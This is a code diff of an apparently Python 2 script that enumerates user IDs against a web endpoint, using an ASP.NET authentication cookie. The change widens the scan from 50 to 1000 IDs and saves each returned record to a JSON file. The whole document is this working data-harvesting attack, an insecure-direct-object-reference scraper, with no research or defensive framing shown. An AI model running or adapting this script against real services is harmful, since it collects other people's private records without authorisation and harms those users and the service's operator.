@@ -36,10 +36,15 @@ cookie = {
     ".ASPXAUTH" : cookie_string
 }
 
-for id in range(0,50):
+for id in range(0,1000):
     payload = {"ID": id}
     r = requests.post(classes_url, cookies=cookie, json=payload, headers=headers)
     if r.text != "[]":
-        print "USER= " + str(id) + ", DATA= " + r.text
+        # print "USER= " + str(id) + ", DATA= " + r.text
+        text_file = open("results/"+str(id)+".json", "w")
+        text_file.write(json.dumps(json.loads(r.text.encode('utf-8').strip()), indent=4, sort_keys=True))
+        text_file.close()
+    # else:
+        # print "USER= " + str(id) + ", DATA= NOT FOUND"
 
 print "Scanning finished!"
